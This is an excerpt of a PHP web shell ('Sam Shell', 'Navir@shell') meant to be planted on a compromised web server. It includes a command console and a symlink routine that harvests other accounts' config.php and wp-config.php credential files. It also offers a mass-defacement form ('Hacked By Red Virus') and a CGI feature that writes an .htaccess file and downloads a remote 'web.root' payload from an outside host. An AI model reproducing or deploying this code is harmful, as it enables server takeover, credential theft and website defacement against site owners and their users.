...
<html>
<head>
    <title>Sam Shell</title>
    <link rel="icon" href="https://e.top4top.io/p_2049rj6kj1.png">
</head>
...
<style>
    ...
    *{
    ...
    .mkdir{
        display: inline-block;width: 900px;
        padding: 70px;
    }
    .file{
        display: inline-block;
...
<?php echo "<span style='color:white'>Safe Mode : </span>"; if(@ini_get("safe_mode") or strtolower(@ini_get("safe_mode") == "on")){
    echo "<span>ON</span>";
}else {
    echo "<span>OFF</span>";
}
    ...
    if (strtoupper(substr(php_uname(), 0, 3)) === 'WIN') {
        ...
        <form method="post">
            <center>
                <div class="wrapper">
                    <div class="cmd">
                        <div class="title-bar">Navir@shell~</div>
                        <div class="tool-bar">
                        </div>
...
if(isset($_POST['send'])){
    if(isset($_GET['path'])){
        if(file_exists("Navir_Config")){
            echo "<center>";
            echo "<br/>";
            echo "<a href='Navir_Config'>Configuration Files</a>";
            echo "</center>";
        }else{
            $dir = mkdir($_GET['path'] ."/Navir_Config",0777);
            $usr=explode("\n",$_POST['config2']);
            foreach ($usr as $uss) {
                $us = trim($uss);
                $r = $_GET['path'] ."/Navir_Config/";
        ...
        if(file_exists("Navir_Config")){
            ...
            $dir = mkdir(getcwd() . "/Navir_Config",0777);
            $usr=explode("\n",$_POST['config2']);
            foreach ($usr as $uss) {
                $us = trim($uss);
                $r = getcwd() . "/Navir_Config/";
                symlink("/". $_POST['home'] . "/".$us."/"."config.php", $r . $us . "config.php");
                symlink("/". $_POST['home'] . "/".$us.'/public_html/wp-config.php',$r.$us.'..wp-config');
        symlink("/". $_POST['home'] . "/".$us.'/public_html/admin/inc/config.php',$r.$us.'..wp-config');
        symlink("/". $_POST['home'] . "/".$us.'/public_html/admin/include/config.php',$r.$us.'..wp-config');
...
if(isset($_POST['mass'])){
    ...
    <form method="post">
        <center>
            ...
            Script Deface:<br/>
            <textarea style="background-color:#262626;border: 1px solid blue" name="source" cols="50" rows="5">Hacked By Red Virus</textarea><br/>
...
if(isset($_POST['cgi'])){
    if($_GET['path']){
        if(file_exists("Navir_CGI")){
            ?>
            <center>
                <a href='<?php echo $_GET['path'] . "/Navir_CGI/"?>'>Click Here</a>
            </center>
            <?php
        }else{
            @mkdir($_GET['path'] . "/Navir_CGI",0777);
            $fi = fopen($_GET['path'] . '/Navir_CGI/.htaccess',"w");
            fwrite($fi, "DefaultType text/html
Options -Indexes +ExecCGI
SetHandler cgi-script");
            $response = file_get_contents("https://raw.githubusercontent.com/RedVirus0/CGI/master/web.root");
            $fil2 = fopen($_GET['path'] . '/Navir_CGI/web.root',"w");
        ...
        if(file_exists("Navir_CGI")){
            ?>
            <center>
                <a href='<?php "Navir_CGI/"?>'>Click Here</a>
            </center>
            <?php
        }else{
            @mkdir("Navir_CGI",0777);
            $local = fopen('Navir_CGI/.htaccess',"w");
            fwrite($local, "DefaultType text/html
Options -Indexes +ExecCGI
SetHandler cgi-script");

            $response = file_get_contents("http://beestyleesh.com/fonts/web.root");
            $local2 = fopen('Navir_CGI/web.root',"w");
            fwrite($local2, $response);
            ?>
            <center>
                <a href="<?php echo "Navir_CGI/" ?>">Click Here</a>
            </center>
        <?php } ?>
    <?php } ?>
<?php } ?>
...
<div class="mkdir" >
    <form action="" method="post">
        ...
        <input type="text" style="background-color: #010406;border:none;color:white" name="mkdir">
        <input class="btn" style="background-color: #010406;border:none;color:white" type="submit" value="Create">
    </form>
</div>
<div class="file">
    <form action="" method="post">
        <label>Create File</label>
        <input style="background-color: #010406;border:none;color:white" type="text" name="file">
        <input style="background-color: #010406;border:none;color:white" class="btn" type="submit" value="Create">
    </form>
</div>
</body>
</html>
